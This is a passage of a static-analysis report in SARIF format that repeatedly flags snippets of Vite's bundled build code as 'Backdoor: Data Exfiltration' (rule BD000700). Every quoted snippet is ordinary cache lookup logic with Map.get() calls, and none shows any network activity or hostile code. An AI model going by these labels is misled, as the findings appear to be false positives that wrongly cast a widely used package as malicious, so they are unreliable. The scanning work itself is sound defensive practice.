                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 37496,
                  "startColumn": 30,
                  "endLine": 37496,
                  "endColumn": 35,
                  "snippet": {
                    "text": "          api === \"modern-compiler\" ? makeModernCompilerScssWorker(resolvers, options.alias) : api === \"modern\" ? makeModernScssWorker(resolvers, options.alias, maxWorkers) : makeScssWorker(resolvers, options.alias, maxWorkers)\n        );\n      }\n      const worker = workerMap.get(options.alias);\n      const { content: data, map: additionalMap } = await getSource(\n        source,\n        options.filename,\n",
                    "rendered": {
                      "text": "          api === \"modern-compiler\" ? makeModernCompilerScssWorker(resolvers, options.alias) : api === \"modern\" ? makeModernScssWorker(resolvers, options.alias, maxWorkers) : makeScssWorker(resolvers, options.alias, maxWorkers)\n        );\n      }\n      const worker = workerMap.get(options.alias);\n      const { content: data, map: additionalMap } = await getSource(\n        source,\n        options.filename,\n",
                      "markdown": "`          api === \"modern-compiler\" ? makeModernCompilerScssWorker(resolvers, options.alias) : api === \"modern\" ? makeModernScssWorker(resolvers, options.alias, maxWorkers) : makeScssWorker(resolvers, options.alias, maxWorkers)\n        );\n      }\n      const worker = workerMap.get(options.alias);\n      const { content: data, map: additionalMap } = await getSource(\n        source,\n        options.filename,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36985,
                  "startColumn": 33,
                  "endLine": 36985,
                  "endColumn": 38,
                  "snippet": {
                    "text": "  return css;\n}\nasync function resolvePostcssConfig(config) {\n  let result = postcssConfigCache.get(config);\n  if (result !== void 0) {\n    return await result;\n  }\n",
                    "rendered": {
                      "text": "  return css;\n}\nasync function resolvePostcssConfig(config) {\n  let result = postcssConfigCache.get(config);\n  if (result !== void 0) {\n    return await result;\n  }\n",
                      "markdown": "`  return css;\n}\nasync function resolvePostcssConfig(config) {\n  let result = postcssConfigCache.get(config);\n  if (result !== void 0) {\n    return await result;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36942,
                  "startColumn": 58,
                  "endLine": 36942,
                  "endColumn": 63,
                  "snippet": {
                    "text": "const preprocessorWorkerControllerCache = /* @__PURE__ */ new WeakMap();\nlet alwaysFakeWorkerWorkerControllerCache;\nasync function preprocessCSS(code, filename, config) {\n  let workerController = preprocessorWorkerControllerCache.get(config);\n  if (!workerController) {\n    alwaysFakeWorkerWorkerControllerCache ||= createPreprocessorWorkerController(0);\n    workerController = alwaysFakeWorkerWorkerControllerCache;\n",
                    "rendered": {
                      "text": "const preprocessorWorkerControllerCache = /* @__PURE__ */ new WeakMap();\nlet alwaysFakeWorkerWorkerControllerCache;\nasync function preprocessCSS(code, filename, config) {\n  let workerController = preprocessorWorkerControllerCache.get(config);\n  if (!workerController) {\n    alwaysFakeWorkerWorkerControllerCache ||= createPreprocessorWorkerController(0);\n    workerController = alwaysFakeWorkerWorkerControllerCache;\n",
                      "markdown": "`const preprocessorWorkerControllerCache = /* @__PURE__ */ new WeakMap();\nlet alwaysFakeWorkerWorkerControllerCache;\nasync function preprocessCSS(code, filename, config) {\n  let workerController = preprocessorWorkerControllerCache.get(config);\n  if (!workerController) {\n    alwaysFakeWorkerWorkerControllerCache ||= createPreprocessorWorkerController(0);\n    workerController = alwaysFakeWorkerWorkerControllerCache;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36714,
                  "startColumn": 51,
                  "endLine": 36714,
                  "endColumn": 56,
                  "snippet": {
                    "text": "}\nconst configToAtImportResolvers = /* @__PURE__ */ new WeakMap();\nfunction getAtImportResolvers(config) {\n  let atImportResolvers = configToAtImportResolvers.get(config);\n  if (!atImportResolvers) {\n    atImportResolvers = createCSSResolvers(config);\n    configToAtImportResolvers.set(config, atImportResolvers);\n",
                    "rendered": {
                      "text": "}\nconst configToAtImportResolvers = /* @__PURE__ */ new WeakMap();\nfunction getAtImportResolvers(config) {\n  let atImportResolvers = configToAtImportResolvers.get(config);\n  if (!atImportResolvers) {\n    atImportResolvers = createCSSResolvers(config);\n    configToAtImportResolvers.set(config, atImportResolvers);\n",
                      "markdown": "`}\nconst configToAtImportResolvers = /* @__PURE__ */ new WeakMap();\nfunction getAtImportResolvers(config) {\n  let atImportResolvers = configToAtImportResolvers.get(config);\n  if (!atImportResolvers) {\n    atImportResolvers = createCSSResolvers(config);\n    configToAtImportResolvers.set(config, atImportResolvers);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36574,
                  "startColumn": 61,
                  "endLine": 36574,
                  "endColumn": 66,
                  "snippet": {
                    "text": "      const { moduleGraph } = server;\n      const thisModule = moduleGraph.getModuleById(id);\n      if (thisModule) {\n        const isSelfAccepting = !cssModulesCache.get(config)?.get(id) && !inlineRE$1.test(id) && !htmlProxyRE.test(id);\n        const pluginImports = this._addedImports;\n        if (pluginImports) {\n          const depModules = /* @__PURE__ */ new Set();\n",
                    "rendered": {
                      "text": "      const { moduleGraph } = server;\n      const thisModule = moduleGraph.getModuleById(id);\n      if (thisModule) {\n        const isSelfAccepting = !cssModulesCache.get(config)?.get(id) && !inlineRE$1.test(id) && !htmlProxyRE.test(id);\n        const pluginImports = this._addedImports;\n        if (pluginImports) {\n          const depModules = /* @__PURE__ */ new Set();\n",
                      "markdown": "`      const { moduleGraph } = server;\n      const thisModule = moduleGraph.getModuleById(id);\n      if (thisModule) {\n        const isSelfAccepting = !cssModulesCache.get(config)?.get(id) && !inlineRE$1.test(id) && !htmlProxyRE.test(id);\n        const pluginImports = this._addedImports;\n        if (pluginImports) {\n          const depModules = /* @__PURE__ */ new Set();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36574,
                  "startColumn": 48,
                  "endLine": 36574,
                  "endColumn": 53,
                  "snippet": {
                    "text": "      const { moduleGraph } = server;\n      const thisModule = moduleGraph.getModuleById(id);\n      if (thisModule) {\n        const isSelfAccepting = !cssModulesCache.get(config)?.get(id) && !inlineRE$1.test(id) && !htmlProxyRE.test(id);\n        const pluginImports = this._addedImports;\n        if (pluginImports) {\n          const depModules = /* @__PURE__ */ new Set();\n",
                    "rendered": {
                      "text": "      const { moduleGraph } = server;\n      const thisModule = moduleGraph.getModuleById(id);\n      if (thisModule) {\n        const isSelfAccepting = !cssModulesCache.get(config)?.get(id) && !inlineRE$1.test(id) && !htmlProxyRE.test(id);\n        const pluginImports = this._addedImports;\n        if (pluginImports) {\n          const depModules = /* @__PURE__ */ new Set();\n",
                      "markdown": "`      const { moduleGraph } = server;\n      const thisModule = moduleGraph.getModuleById(id);\n      if (thisModule) {\n        const isSelfAccepting = !cssModulesCache.get(config)?.get(id) && !inlineRE$1.test(id) && !htmlProxyRE.test(id);\n        const pluginImports = this._addedImports;\n        if (pluginImports) {\n          const depModules = /* @__PURE__ */ new Set();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36549,
                  "startColumn": 60,
                  "endLine": 36549,
                  "endColumn": 65,
                  "snippet": {
                    "text": "            }\n          }\n        }\n        const removedPureCssFiles = removedPureCssFilesCache.get(config);\n        pureCssChunkNames.forEach((fileName) => {\n          removedPureCssFiles.set(fileName, bundle[fileName]);\n          delete bundle[fileName];\n",
                    "rendered": {
                      "text": "            }\n          }\n        }\n        const removedPureCssFiles = removedPureCssFilesCache.get(config);\n        pureCssChunkNames.forEach((fileName) => {\n          removedPureCssFiles.set(fileName, bundle[fileName]);\n          delete bundle[fileName];\n",
                      "markdown": "`            }\n          }\n        }\n        const removedPureCssFiles = removedPureCssFilesCache.get(config);\n        pureCssChunkNames.forEach((fileName) => {\n          removedPureCssFiles.set(fileName, bundle[fileName]);\n          delete bundle[fileName];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36495,
                  "startColumn": 28,
                  "endLine": 36495,
                  "endColumn": 33,
                  "snippet": {
                    "text": "          chunk.dynamicImports.forEach(\n            (importName) => dynamicImports.add(importName)\n          );\n          css += chunkCSSMap.get(chunk.preliminaryFileName) ?? \"\";\n        }\n        for (const chunk of Object.values(bundle)) {\n          if (chunk.type === \"chunk\" && chunk.isEntry) {\n",
                    "rendered": {
                      "text": "          chunk.dynamicImports.forEach(\n            (importName) => dynamicImports.add(importName)\n          );\n          css += chunkCSSMap.get(chunk.preliminaryFileName) ?? \"\";\n        }\n        for (const chunk of Object.values(bundle)) {\n          if (chunk.type === \"chunk\" && chunk.isEntry) {\n",
                      "markdown": "`          chunk.dynamicImports.forEach(\n            (importName) => dynamicImports.add(importName)\n          );\n          css += chunkCSSMap.get(chunk.preliminaryFileName) ?? \"\";\n        }\n        for (const chunk of Object.values(bundle)) {\n          if (chunk.type === \"chunk\" && chunk.isEntry) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36428,
                  "startColumn": 27,
                  "endLine": 36428,
                  "endColumn": 32,
                  "snippet": {
                    "text": "              originalFileName,\n              source: chunkCSS\n            });\n            generatedAssets.get(config).set(referenceId, { originalFileName, isEntry });\n            chunk.viteMetadata.importedCss.add(this.getFileName(referenceId));\n          } else if (!config.build.ssr) {\n            chunkCSS = await finalizeCss(chunkCSS, true, config);\n",
                    "rendered": {
                      "text": "              originalFileName,\n              source: chunkCSS\n            });\n            generatedAssets.get(config).set(referenceId, { originalFileName, isEntry });\n            chunk.viteMetadata.importedCss.add(this.getFileName(referenceId));\n          } else if (!config.build.ssr) {\n            chunkCSS = await finalizeCss(chunkCSS, true, config);\n",
                      "markdown": "`              originalFileName,\n              source: chunkCSS\n            });\n            generatedAssets.get(config).set(referenceId, { originalFileName, isEntry });\n            chunk.viteMetadata.importedCss.add(this.getFileName(referenceId));\n          } else if (!config.build.ssr) {\n            chunkCSS = await finalizeCss(chunkCSS, true, config);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36389,
                  "startColumn": 25,
                  "endLine": 36389,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            originalFileName,\n            source: content\n          });\n          generatedAssets.get(config).set(referenceId, { originalFileName });\n          const filename = this.getFileName(referenceId);\n          chunk.viteMetadata.importedAssets.add(cleanUrl(filename));\n          const replacement = toOutputFilePathInJS(\n",
                    "rendered": {
                      "text": "            originalFileName,\n            source: content\n          });\n          generatedAssets.get(config).set(referenceId, { originalFileName });\n          const filename = this.getFileName(referenceId);\n          chunk.viteMetadata.importedAssets.add(cleanUrl(filename));\n          const replacement = toOutputFilePathInJS(\n",
                      "markdown": "`            originalFileName,\n            source: content\n          });\n          generatedAssets.get(config).set(referenceId, { originalFileName });\n          const filename = this.getFileName(referenceId);\n          chunk.viteMetadata.importedAssets.add(cleanUrl(filename));\n          const replacement = toOutputFilePathInJS(\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36352,
                  "startColumn": 33,
                  "endLine": 36352,
                  "endColumn": 38,
                  "snippet": {
                    "text": "              `css content for ${JSON.stringify(id)} was not found`\n            );\n          }\n          let cssContent = styles.get(id);\n          cssContent = resolveAssetUrlsInCss(cssContent, cssAssetName);\n          urlEmitTasks.push({\n            cssAssetName,\n",
                    "rendered": {
                      "text": "              `css content for ${JSON.stringify(id)} was not found`\n            );\n          }\n          let cssContent = styles.get(id);\n          cssContent = resolveAssetUrlsInCss(cssContent, cssAssetName);\n          urlEmitTasks.push({\n            cssAssetName,\n",
                      "markdown": "`              `css content for ${JSON.stringify(id)} was not found`\n            );\n          }\n          let cssContent = styles.get(id);\n          cssContent = resolveAssetUrlsInCss(cssContent, cssAssetName);\n          urlEmitTasks.push({\n            cssAssetName,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36314,
                  "startColumn": 47,
                  "endLine": 36314,
                  "endColumn": 52,
                  "snippet": {
                    "text": "            path$n.relative(cssAssetDirname, \"\")\n          );\n          chunkCSS2 = chunkCSS2.replace(publicAssetUrlRE, (_, hash) => {\n            const publicUrl = publicAssetUrlMap.get(hash).slice(1);\n            return encodeURIPath(\n              toOutputFilePathInCss(\n                publicUrl,\n",
                    "rendered": {
                      "text": "            path$n.relative(cssAssetDirname, \"\")\n          );\n          chunkCSS2 = chunkCSS2.replace(publicAssetUrlRE, (_, hash) => {\n            const publicUrl = publicAssetUrlMap.get(hash).slice(1);\n            return encodeURIPath(\n              toOutputFilePathInCss(\n                publicUrl,\n",
                      "markdown": "`            path$n.relative(cssAssetDirname, \"\")\n          );\n          chunkCSS2 = chunkCSS2.replace(publicAssetUrlRE, (_, hash) => {\n            const publicUrl = publicAssetUrlMap.get(hash).slice(1);\n            return encodeURIPath(\n              toOutputFilePathInCss(\n                publicUrl,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36284,
                  "startColumn": 51,
                  "endLine": 36284,
                  "endColumn": 56,
                  "snippet": {
                    "text": "          isPureCssChunk = false;\n        }\n      }\n      const publicAssetUrlMap = publicAssetUrlCache.get(config);\n      const resolveAssetUrlsInCss = (chunkCSS2, cssAssetName) => {\n        const encodedPublicUrls = encodePublicUrlsInCSS(config);\n        const relative = config.base === \"./\" || config.base === \"\";\n",
                    "rendered": {
                      "text": "          isPureCssChunk = false;\n        }\n      }\n      const publicAssetUrlMap = publicAssetUrlCache.get(config);\n      const resolveAssetUrlsInCss = (chunkCSS2, cssAssetName) => {\n        const encodedPublicUrls = encodePublicUrlsInCSS(config);\n        const relative = config.base === \"./\" || config.base === \"\";\n",
                      "markdown": "`          isPureCssChunk = false;\n        }\n      }\n      const publicAssetUrlMap = publicAssetUrlCache.get(config);\n      const resolveAssetUrlsInCss = (chunkCSS2, cssAssetName) => {\n        const encodedPublicUrls = encodePublicUrlsInCSS(config);\n        const relative = config.base === \"./\" || config.base === \"\";\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36275,
                  "startColumn": 30,
                  "endLine": 36275,
                  "endColumn": 35,
                  "snippet": {
                    "text": "      for (const id of ids) {\n        if (styles.has(id)) {\n          if (!transformOnlyRE.test(id)) {\n            chunkCSS += styles.get(id);\n            if (cssModuleRE.test(id)) {\n              isPureCssChunk = false;\n            }\n",
                    "rendered": {
                      "text": "      for (const id of ids) {\n        if (styles.has(id)) {\n          if (!transformOnlyRE.test(id)) {\n            chunkCSS += styles.get(id);\n            if (cssModuleRE.test(id)) {\n              isPureCssChunk = false;\n            }\n",
                      "markdown": "`      for (const id of ids) {\n        if (styles.has(id)) {\n          if (!transformOnlyRE.test(id)) {\n            chunkCSS += styles.get(id);\n            if (cssModuleRE.test(id)) {\n              isPureCssChunk = false;\n            }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36208,
                  "startColumn": 49,
                  "endLine": 36208,
                  "endColumn": 54,
                  "snippet": {
                    "text": "        return `export default ''`;\n      }\n      const inlined = inlineRE$1.test(id);\n      const modules = cssModulesCache.get(config).get(id);\n      const modulesCode = modules && !inlined && dataToEsm(modules, { namedExports: true, preferConst: true });\n      if (config.command === \"serve\") {\n        const getContentWithSourcemap = async (content) => {\n",
                    "rendered": {
                      "text": "        return `export default ''`;\n      }\n      const inlined = inlineRE$1.test(id);\n      const modules = cssModulesCache.get(config).get(id);\n      const modulesCode = modules && !inlined && dataToEsm(modules, { namedExports: true, preferConst: true });\n      if (config.command === \"serve\") {\n        const getContentWithSourcemap = async (content) => {\n",
                      "markdown": "`        return `export default ''`;\n      }\n      const inlined = inlineRE$1.test(id);\n      const modules = cssModulesCache.get(config).get(id);\n      const modulesCode = modules && !inlined && dataToEsm(modules, { namedExports: true, preferConst: true });\n      if (config.command === \"serve\") {\n        const getContentWithSourcemap = async (content) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 36208,
                  "startColumn": 37,
                  "endLine": 36208,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        return `export default ''`;\n      }\n      const inlined = inlineRE$1.test(id);\n      const modules = cssModulesCache.get(config).get(id);\n      const modulesCode = modules && !inlined && dataToEsm(modules, { namedExports: true, preferConst: true });\n      if (config.command === \"serve\") {\n        const getContentWithSourcemap = async (content) => {\n",
                    "rendered": {
                      "text": "        return `export default ''`;\n      }\n      const inlined = inlineRE$1.test(id);\n      const modules = cssModulesCache.get(config).get(id);\n      const modulesCode = modules && !inlined && dataToEsm(modules, { namedExports: true, preferConst: true });\n      if (config.command === \"serve\") {\n        const getContentWithSourcemap = async (content) => {\n",
                      "markdown": "`        return `export default ''`;\n      }\n      const inlined = inlineRE$1.test(id);\n      const modules = cssModulesCache.get(config).get(id);\n      const modulesCode = modules && !inlined && dataToEsm(modules, { namedExports: true, preferConst: true });\n      if (config.command === \"serve\") {\n        const getContentWithSourcemap = async (content) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35568,
                  "startColumn": 52,
                  "endLine": 35568,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        while (match = inlineCSSRE$1.exec(result)) {\n          s ||= new MagicString(result);\n          const { 0: full, 1: scopedName } = match;\n          const cssTransformedCode = htmlProxyResult.get(scopedName);\n          s.update(match.index, match.index + full.length, cssTransformedCode);\n        }\n        if (s) {\n",
                    "rendered": {
                      "text": "        while (match = inlineCSSRE$1.exec(result)) {\n          s ||= new MagicString(result);\n          const { 0: full, 1: scopedName } = match;\n          const cssTransformedCode = htmlProxyResult.get(scopedName);\n          s.update(match.index, match.index + full.length, cssTransformedCode);\n        }\n        if (s) {\n",
                      "markdown": "`        while (match = inlineCSSRE$1.exec(result)) {\n          s ||= new MagicString(result);\n          const { 0: full, 1: scopedName } = match;\n          const cssTransformedCode = htmlProxyResult.get(scopedName);\n          s.update(match.index, match.index + full.length, cssTransformedCode);\n        }\n        if (s) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35509,
                  "startColumn": 52,
                  "endLine": 35509,
                  "endColumn": 57,
                  "snippet": {
                    "text": "        };\n        const toOutputAssetFilePath = (filename) => toOutputFilePath(filename, \"asset\");\n        const toOutputPublicAssetFilePath = (filename) => toOutputFilePath(filename, \"public\");\n        const isAsync = isAsyncScriptMap.get(config).get(normalizedId);\n        let result = html;\n        const chunk = Object.values(bundle).find(\n          (chunk2) => chunk2.type === \"chunk\" && chunk2.isEntry && chunk2.facadeModuleId && normalizePath$3(chunk2.facadeModuleId) === normalizedId\n",
                    "rendered": {
                      "text": "        };\n        const toOutputAssetFilePath = (filename) => toOutputFilePath(filename, \"asset\");\n        const toOutputPublicAssetFilePath = (filename) => toOutputFilePath(filename, \"public\");\n        const isAsync = isAsyncScriptMap.get(config).get(normalizedId);\n        let result = html;\n        const chunk = Object.values(bundle).find(\n          (chunk2) => chunk2.type === \"chunk\" && chunk2.isEntry && chunk2.facadeModuleId && normalizePath$3(chunk2.facadeModuleId) === normalizedId\n",
                      "markdown": "`        };\n        const toOutputAssetFilePath = (filename) => toOutputFilePath(filename, \"asset\");\n        const toOutputPublicAssetFilePath = (filename) => toOutputFilePath(filename, \"public\");\n        const isAsync = isAsyncScriptMap.get(config).get(normalizedId);\n        let result = html;\n        const chunk = Object.values(bundle).find(\n          (chunk2) => chunk2.type === \"chunk\" && chunk2.isEntry && chunk2.facadeModuleId && normalizePath$3(chunk2.facadeModuleId) === normalizedId\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35509,
                  "startColumn": 40,
                  "endLine": 35509,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        };\n        const toOutputAssetFilePath = (filename) => toOutputFilePath(filename, \"asset\");\n        const toOutputPublicAssetFilePath = (filename) => toOutputFilePath(filename, \"public\");\n        const isAsync = isAsyncScriptMap.get(config).get(normalizedId);\n        let result = html;\n        const chunk = Object.values(bundle).find(\n          (chunk2) => chunk2.type === \"chunk\" && chunk2.isEntry && chunk2.facadeModuleId && normalizePath$3(chunk2.facadeModuleId) === normalizedId\n",
                    "rendered": {
                      "text": "        };\n        const toOutputAssetFilePath = (filename) => toOutputFilePath(filename, \"asset\");\n        const toOutputPublicAssetFilePath = (filename) => toOutputFilePath(filename, \"public\");\n        const isAsync = isAsyncScriptMap.get(config).get(normalizedId);\n        let result = html;\n        const chunk = Object.values(bundle).find(\n          (chunk2) => chunk2.type === \"chunk\" && chunk2.isEntry && chunk2.facadeModuleId && normalizePath$3(chunk2.facadeModuleId) === normalizedId\n",
                      "markdown": "`        };\n        const toOutputAssetFilePath = (filename) => toOutputFilePath(filename, \"asset\");\n        const toOutputPublicAssetFilePath = (filename) => toOutputFilePath(filename, \"public\");\n        const isAsync = isAsyncScriptMap.get(config).get(normalizedId);\n        let result = html;\n        const chunk = Object.values(bundle).find(\n          (chunk2) => chunk2.type === \"chunk\" && chunk2.isEntry && chunk2.facadeModuleId && normalizePath$3(chunk2.facadeModuleId) === normalizedId\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 35373,
                  "startColumn": 24,
                  "endLine": 35373,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            );\n          }\n        });\n        isAsyncScriptMap.get(config).set(id, everyScriptIsAsync);\n        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\n",
                    "rendered": {
                      "text": "            );\n          }\n        });\n        isAsyncScriptMap.get(config).set(id, everyScriptIsAsync);\n        if (someScriptsAreAsync && someScriptsAreDefer) {\n          config.logger.warn(\n            `\n",
